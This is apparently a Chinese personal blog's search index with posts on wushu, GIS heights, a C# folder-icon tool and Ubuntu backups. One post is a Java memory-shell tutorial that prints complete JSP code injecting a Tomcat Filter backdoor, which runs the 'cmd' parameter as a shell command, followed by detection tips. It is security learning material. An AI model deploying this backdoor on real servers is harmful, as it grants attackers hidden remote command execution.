五步拳是武术入门套路,也是武术的基本拳术。是武术运动员必须掌握与练习的基础拳法。其套路包含武术中最基本的弓、马、仆、虚、歇五种步型和拳、掌、勾三种手型及上步，退步步法与搂手、冲拳、按掌、穿掌、挑掌、架打、盖打等手法。通过五步拳的练习可以增进身体的协调能力,掌握动作与动作之间的衔接要领,提高动作质量。为进一步学习武术打下扎实的基础。 ","date":"2022-01-11","objectID":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/:1:0","tags":null,"title":"五步拳","uri":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/"},{"categories":["武术"],"content":"动作名称 ","date":"2022-01-11","objectID":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/:2:0","tags":null,"title":"五步拳","uri":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/"},{"categories":["武术"],"content":"预览 预备式（并步抱拳）→弓步冲拳→弹踢冲拳→马步架打→歇步盖打→提膝穿掌→仆步穿掌→虚步挑掌→【反向来一遍再】→收式 ","date":"2022-01-11","objectID":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/:2:1","tags":null,"title":"五步拳","uri":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/"},{"categories":["武术"],"content":"解析 1、预备姿势（并步抱拳） 有的版本是预备式之后，右手抱拳于腰间，左掌平砍掌成仆步 2、弓步冲拳 成左弓步,左手向左平搂收回腰间抱拳；冲右拳，目视前方 3、弹踢冲拳: 重心前移,右腿向前弹踢,同时冲左拳,收右拳，目视前方 易犯错误：弹踢没有收大腿弹小腿 4、马步架打: 右脚落地,向左转体90°,下蹲成马步,同时左拳变掌,屈臂上架,冲右拳，目视右方 5、歇步盖冲拳: 左脚向右脚后插一步（有的版本后插一步在下一步的时候做）,同时右拳变掌向左下盖,掌外沿向前,身体左转90°,收左拳;目视右掌。 易犯错误：左脚没有后插一步，右掌只盖到头顶 上动不停,两腿屈膝下蹲成歇步,同时冲左拳,收右拳，目视左拳。 易犯错误：歇步时臀部没有坐到后退脚跟上，坐拳变成下冲拳 6、提膝仆步穿掌: 两腿起立,身体左转。随即左拳变掌,顺势收至右腋下;右拳变掌,由左手背上穿出,手心向上。同时左腿屈膝提起,目视右手。 易犯错误：左腿没有充分提膝，右掌没有从左手背上穿出 上动不停,左脚落地成仆步;左手掌指朝前,沿左腿内侧穿至左脚面，目视左掌。 然后接动作： 7、虚步挑掌: 左腿屈膝前弓,右脚前上成右虚步。同时左手向后划弧成勾手,右手顺右腿外侧向上挑掌，目视前方。 易犯错误：身体容易前倾，重心容易落在前腿上 8、反向再来一遍 1.与上一遍的衔接动作：提右脚，左手抱拳腰间，右手变掌防于左腋下 2.反向再来一遍 9.并步抱拳: 左脚向右脚靠拢成并步。同时左钩手和右掌变拳,回收抱于腰间，目视前方。 ","date":"2022-01-11","objectID":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/:2:2","tags":null,"title":"五步拳","uri":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/"},{"categories":["武术"],"content":"附 版本一： 您的浏览器不支持 video 标签。 版本二（塔沟）： 您的浏览器不支持 video 标签。 ","date":"2022-01-11","objectID":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/:3:0","tags":null,"title":"五步拳","uri":"/%E4%BA%94%E6%AD%A5%E6%8B%B3/"},{"categories":["渗透测试"],"content":"简介 内存马主要分为以下几类： servlet-api类 filter型 servlet型 spring类 拦截器 controller型 Java Instrumentation类 agent型 （第一次学习，先以Filter的分析为主），这种类型的内存马，就是在Filter过滤器上做了点手脚。 Filter称为过滤器，是Servlet2.3新增的一种技术，同时也是Servlet技术中最实用的技术。通过Filter技术，可以实现对所有Web资源的管理，如实现权限访问控制、过滤敏感词汇、压缩响应信息等。 **Filter过滤器实现流程：**每当客户端请求servlet的时候，都会经过过滤器，而过滤器在实战项目中，通常用来进行一些session的校验等。统一设置编码格式，敏感字符过滤等 Filter中有个doFilter方法，当开发人员写Filter的拦截逻辑，并配置对哪个web资源进行拦截后，web服务器就会在每次调用web资源的service()方法之前先调用doFilter()方法 过滤器先接收到请求，然后再转发给Servlet，然后Servlet走了之后又回到过滤器中再之后doFilter之后的内容 详细的Filter的知识请翻看有关文章，本文不再细讲 ","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:1:0","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"实现流程 ","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:2:0","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"0x01 新建Maven项目 引入servlet包啥的 \u003cdependencies\u003e \u003c!--Servlet依赖--\u003e \u003cdependency\u003e \u003cgroupId\u003ejavax.servlet\u003c/groupId\u003e \u003cartifactId\u003ejavax.servlet-api\u003c/artifactId\u003e \u003cversion\u003e4.0.1\u003c/version\u003e \u003cscope\u003eprovided\u003c/scope\u003e \u003c/dependency\u003e \u003c!--JSP依赖--\u003e \u003cdependency\u003e \u003cgroupId\u003ejavax.servlet.jsp\u003c/groupId\u003e \u003cartifactId\u003ejsp-api\u003c/artifactId\u003e \u003cversion\u003e2.2\u003c/version\u003e \u003cscope\u003eprovided\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003e ","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:2:1","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"0x02 一个Tomcat Filter简单案例 新建filter： import javax.servlet.*; import java.io.IOException; public class MyFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\"Filter 创建\"); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(\"执行过滤过程\"); filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { System.out.println(\"销毁了！\"); } } web.xml: \u003c!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\" \u003e \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"\u003e \u003cdisplay-name\u003eArchetype Created Web Application\u003c/display-name\u003e \u003c!-- 我们创建一个servlet和一个filter 访问路由都是为/test--\u003e \u003cservlet\u003e \u003cservlet-name\u003eHelloServlet\u003c/servlet-name\u003e \u003cservlet-class\u003eTestServlet\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eHelloServlet\u003c/servlet-name\u003e \u003curl-pattern\u003e/test\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cfilter\u003e \u003cfilter-name\u003etestFilter\u003c/filter-name\u003e \u003cfilter-class\u003eMyFilter\u003c/filter-class\u003e \u003c/filter\u003e \u003cfilter-mapping\u003e \u003cfilter-name\u003etestFilter\u003c/filter-name\u003e \u003curl-pattern\u003e/test\u003c/url-pattern\u003e \u003c/filter-mapping\u003e \u003c/web-app\u003e 对应Web.xml中的配置信息，这种方式就是为静态的添加filter的方式，filter实现分为静态和动态，静态就是上述中，普通配置在web.xml或者通过@注释配置在类中的。 ","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:2:2","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"0x03 一个简单Filter内存马案例 首先创建一个恶意Filter 利用 FilterDef 对 Filter 进行一个封装 将 FilterDef 添加到 FilterDefs 和 FilterConfig 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发） ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); // ApplicationContext 为 ServletContext 的实现类 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); // 这样我们就获取到了 context StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 1.首先来编写一个filter的恶意类 在doFilter方法中写下实现的功能 代码如下： \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.util.Map\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %\u003e \u003c%@ page import=\"java.lang.reflect.Constructor\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %\u003e \u003c%@ page import=\"org.apache.catalina.Context\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e \u003c%@ page import=\"java.io.InputStreamReader\" %\u003e \u003c%@ page import=\"java.io.BufferedReader\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c% final String name = \"xps\"; ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); if (filterConfigs.get(name) == null){ Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { //这里写上我们后门的主要代码 HttpServletRequest req = (HttpServletRequest) servletRequest; if (req.getParameter(\"cmd\") != null){ InputStream in = Runtime.getRuntime().exec(req.getParameter(\"cmd\")).getInputStream(); // Scanner s = new Scanner(in).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; servletResponse.getWriter().write(output); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); // 将filterDef添加到filterDefs中 standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); //拦截的路由规则，/* 表示拦截任意路由 filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); filterConfigs.put(name,filterConfig); out.print(\"注入成功\"); } %\u003e web.xml同上 \u003c!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\" \u003e \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:2:3","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"0x04 实战真正内存马 首先得明白一点，在实战环境下，你不可能写一个Filter对象然后又放到对方的代码中，这样子不就早getshell了，而且就算修改了，想要生效也需要重启。所以我们需要找到一个注入点，动态的在内存中插入filter对象，这样才叫做一个真正的内存马了，那我们该如何操作呢？ 知识点1：ServletContext web应用启动的时候，都会产生一个ServletContext为接口的对象，因为在web中这个ServletContext对象的一些数据能够保证Servlets稳定运行。 那么该对象如何获得？ 在tomcat容器中中ServletContext的实现类是ApplicationContext类 在web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，所以说我们在tomcat中拿到StandardContext则是去获取ApplicationContextFacade这个对象。 看完我也是懵懵的… 知识点2：组装Filters的流程 要调试Tomcat的话，需要注意的记得把tomcat下的lib文件导入到idea工程中，要不然idea在调试的时候是找不到的！ 知识点3：FilterConfig 最终代码 如下：shell.jsp \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.util.Map\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %\u003e \u003c%@ page import=\"java.lang.reflect.Constructor\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %\u003e \u003c%@ page import=\"org.apache.catalina.Context\" %\u003e \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c% // 1.获取当前应用的ServletContext对象(这里是反射获取ApplicationContext的context，也就是standardContext) final String name = \"xps\"; ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // 2.再获取filterConfigs Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); // 3.接着实现自定义想要注入的filter对象 if (filterConfigs.get(name) == null){ Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { //这里是后门的主要代码 HttpServletRequest req = (HttpServletRequest) request; if (req.getParameter(\"cmd\") != null) { boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", req.getParameter(\"cmd\")} : new String[]{\"cmd.exe\", \"/c\", req.getParameter(\"cmd\")}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\a\"); String output = s.hasNext() ? s.next() : \"\"; response.getWriter().write(output); response.getWriter().flush(); } //别忘记带这个，不然的话其他的过滤器可能无法使用 chain.doFilter(request, response); } } @Override public void destroy() { } }; //4.然后为自定义对象的filter创建一个FilterDef FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); // 将filterDef添加到filterDefs中 standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); //拦截的路由规则，/* 表示拦截任意路由，这里优先级调到最高 filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //5.最后把 ServletContext对象 filter对象 FilterDef全部都设置到filterConfigs即可完成内存马的实现 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); filterConfigs.put(name,filterConfig); out.print(\"内存马注入成功\"); } %\u003e 访问这个页面： 最后直接访问任意Servlet路由都可以执","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:2:4","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"内存马排查 如果是jsp注入，日志中排查可疑jsp的访问请求。 如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法 根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。 如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200 参考这篇：https://gv7.me/articles/2020/kill-java-web-filter-memshell/ ","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:3:0","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["渗透测试"],"content":"参考文章： 查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me) SpringBoot Controller 内存马 / yso定制 - zpchcbd - 博客园 (cnblogs.com) SpringBoot Interceptor 内存马 - zpchcbd - 博客园 (cnblogs.com) Java Filter型内存马的学习与实践 - zpchcbd - 博客园 (cnblogs.com) Java还是学的太菜了，未完待续，以后学的更深入了继续来深耕…… ","date":"2022-01-10","objectID":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/:4:0","tags":["Java安全","内存马"],"title":"Java内存马初探（一）","uri":"/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/"},{"categories":["GIS"],"content":"大地高 地面上某点到沿通过该点的椭球面法线，到参考椭球面的距离。 地形图上的高度是海拔高，GPS读出的高度是大地高。 ","date":"2022-01-08","objectID":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/:1:0","tags":null,"title":"大地高、正高和正常高的区别","uri":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["GIS"],"content":"正高 点位沿铅垂线至大地水准面的高度称海拔高 大地水准面与椭球面之间的距离叫大地水准面差距。 ","date":"2022-01-08","objectID":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/:2:0","tags":null,"title":"大地高、正高和正常高的区别","uri":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["GIS"],"content":"正常高 沿铅锤方向到似大地水准面的高度叫做正常高 我国目前采用的法定高程系统就是正常高系统 问：有正高不就行了，为什么还要有一个正常高？ 答：确切地说，正高有完整的物理意义，对于测量来说意义重大，但有一个致命的问题，就是没办法测量出来。 原因是引力常数没法确定，也就是重力加速度g未知。 高中物理所学的是9.8，但这是个平均数，测量要求的是精确，每个地方的引力常数没办法精确测量， 于是人们为了方便计算起见，引入了一个跟大地水准面极为类似的面，这就是似大地水准面。 ","date":"2022-01-08","objectID":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/:3:0","tags":null,"title":"大地高、正高和正常高的区别","uri":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["GIS"],"content":"高程异常ξ 高程异常ξ是似大地水准面与参考椭球面之间的高差。 公式：ξ=H-h， 其中H是大地高，h是正常高。 ","date":"2022-01-08","objectID":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/:4:0","tags":null,"title":"大地高、正高和正常高的区别","uri":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["GIS"],"content":"大地高，正高，正常高之间的关系 ","date":"2022-01-08","objectID":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/:5:0","tags":null,"title":"大地高、正高和正常高的区别","uri":"/%E5%A4%A7%E5%9C%B0%E9%AB%98%E6%AD%A3%E9%AB%98%E5%92%8C%E6%AD%A3%E5%B8%B8%E9%AB%98%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":null,"content":"准备迁移自己的博客，不想折腾了，想找一个更适合自己专注写作的方式，虽然hexo已经很好了… ","date":"2022-01-06","objectID":"/%E5%87%86%E5%A4%87%E8%BF%81%E7%A7%BB%E5%8D%9A%E5%AE%A2%E5%95%A6/:0:0","tags":null,"title":"准备迁移博客啦","uri":"/%E5%87%86%E5%A4%87%E8%BF%81%E7%A7%BB%E5%8D%9A%E5%AE%A2%E5%95%A6/"},{"categories":["Windows"],"content":"前景提示 小学弟要我写这种奇奇怪怪的东西，奇奇怪怪的东西…. 😆 好了，那就写写吧，谁让我这么可爱呢（小菜鸡瑟瑟发抖） 😅 ","date":"2021-07-23","objectID":"/windows%E6%9B%B4%E6%8D%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87/:0:1","tags":["windows","C#","自写小工具"],"title":"Windows更换指定文件夹图标","uri":"/windows%E6%9B%B4%E6%8D%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87/"},{"categories":["Windows"],"content":"正题 先画个界面（哈哈指向画界面不行写代码） 贴上垃圾的code： using System; using System.Collections.Generic; using System.ComponentModel; using System.Data; using System.Diagnostics; using System.Drawing; using System.IO; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace 更换指定文件夹图标 { public partial class Form1 : Form { public string foldPath; public string icoPath; public string desktopiniPath; public Form1() { InitializeComponent(); } // 选择要更换的文件夹 private void textBox1_MouseClick(object sender, MouseEventArgs e) { try { this.textBox1.Text = \"\"; FolderBrowserDialog dialog = new FolderBrowserDialog(); dialog.Description = \"请选择文件路径\"; if (dialog.ShowDialog() == DialogResult.OK) { foldPath = dialog.SelectedPath; } //System.Diagnostics.Process.Start(\"Explorer.exe\", \"c:\\\\windows\"); this.textBox1.Text = foldPath; } catch (Exception) { MessageBox.Show(\"请正确选择图标文件!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information); } } //选择要更换的图标 private void textBox2_MouseClick(object sender, MouseEventArgs e) { try { this.textBox2.Text = \"\"; OpenFileDialog open = new OpenFileDialog(); open.CheckFileExists = true; open.Multiselect = false; open.RestoreDirectory = true; open.Multiselect = false; open.RestoreDirectory = true; open.Filter = \"图标文件(*.*)|*.ico\"; if (open.ShowDialog() == System.Windows.Forms.DialogResult.OK) { // 获取文件路径 icoPath = open.FileName; this.textBox2.Text = icoPath; } } catch (Exception) { MessageBox.Show(\"请正确选择图标文件!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information); } } private void button1_Click(object sender, EventArgs e) { if (textBox1.Text != \"\" \u0026\u0026 textBox2.Text != \"\" \u0026\u0026 textBox3.Text != \"\" \u0026\u0026 textBox4.Text != \"\") { //1.新建desktop.ini文件 desktopiniPath = foldPath + \"\\\\desktop.ini\"; //设置文件路径 if (!File.Exists(desktopiniPath)) { FileStream fs1 = new FileStream(desktopiniPath, FileMode.Create, FileAccess.Write);//创建写入文件 StreamWriter sw = new StreamWriter(fs1); sw.WriteLine(\"[.ShellClassInfo]\");//开始写入值 sw.WriteLine(\"InfoTip=\" + textBox3.Text); sw.WriteLine(\"LocalizedResourceName=\" + textBox4.Text); sw.WriteLine(\"\"); sw.WriteLine(\"IconFile=\" + icoPath); sw.WriteLine(\"IconIndex=mainicon\"); sw.WriteLine(\"\"); sw.WriteLine(\"[[ExtShellFolderViews]]\"); sw.WriteLine(\"[{BE098140-A513-11D0-A3A4-00C04FD706EC}]\"); sw.WriteLine(\"IconArea_Text=0x000000FF\"); sw.WriteLine(\"\"); sw.WriteLine(\"[DeleteOnCopy]\"); sw.WriteLine(\"Owner=Temp\"); sw.WriteLine(\"PersonalizedName=My test file\"); sw.WriteLine(\"\"); sw.WriteLine(\"[ViewState]\"); sw.WriteLine(\"Mode=\"); sw.WriteLine(\"Vid=\"); sw.WriteLine(\"FolderType=Generic\"); sw.Close(); fs1.Close(); } } else { MessageBox.Show(\"请输入完整文本框内容!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information); } //2. Process CmdProcess = new Process(); CmdProcess.StartInfo.FileName = \"cmd.exe\"; CmdProcess.StartInfo.WorkingDirectory = foldPath; // cmd打开的目录 CmdProcess.StartInfo.CreateNoWindow = true; // 不创建新窗口 CmdProcess.StartInfo.UseShellExecute = false; //不启用shell启动进程 CmdProcess.StartInfo.RedirectStandardInput = true; // 重定向输入 CmdProcess.StartInfo.RedirectStandardOutput = true; // 重定向标准输出 CmdProcess.StartInfo.RedirectStandardError = true; // 重定向错误输出 //2.1隐藏desktop.ini文件 // attrib +h temp/desktop.ini // attrib +s temp DirectoryInfo pathInfo = new DirectoryInfo(foldPath); //string newPath = pathInfo.Parent.FullName; //父目录名 int index = foldPath.LastIndexOf('\\\\'); //从下一个索引开始截取 string desktopName = foldPath.Substring(index + 1); //后面文件名 CmdProcess.Start();//执行 CmdProcess.StandardInput.WriteLine(\"attrib +h \" + desktopiniPath + \"\u0026\u0026 cd .. \u0026\u0026 attrib +s \" + desktopName + \" \u0026\u0026 exit\"); CmdProcess.StandardInput.AutoFlush = true; CmdProcess.WaitForExit();//等待程序执行完退出进程 CmdProcess.Close();//结束 MessageBox.Show(\"OK!\", \"提示\", MessageBoxButtons.OK, MessageBoxIcon.Information); } } } 链接： https://github.com/shuai06/ChangeDirLogo ","date":"2021-07-23","objectID":"/windows%E6%9B%B4%E6%8D%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87/:0:2","tags":["windows","C#","自写小工具"],"title":"Windows更换指定文件夹图标","uri":"/windows%E6%9B%B4%E6%8D%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87/"},{"categories":["Windows"],"content":"BUG 完成之后确实更改了，但是有一定延迟……😢 ","date":"2021-07-23","objectID":"/windows%E6%9B%B4%E6%8D%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87/:0:3","tags":["windows","C#","自写小工具"],"title":"Windows更换指定文件夹图标","uri":"/windows%E6%9B%B4%E6%8D%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87/"},{"categories":["Linux"],"content":"备份还原 备份是免于损失的有效手段 防火防盗防自己（保持良好睡眠） 版本管理也视为一种备份(上下文不同) ","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:0:0","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"备份还原基础 ","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:1:0","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"首先考虑问题 1. what to backup 数据、配置、操作系统、运行环境 2. where to back 本地、远程、异地三个副本 磁盘、光盘、磁带、一次性写入介质 3. how to restore it 备份系统自动恢复 人工手动恢复 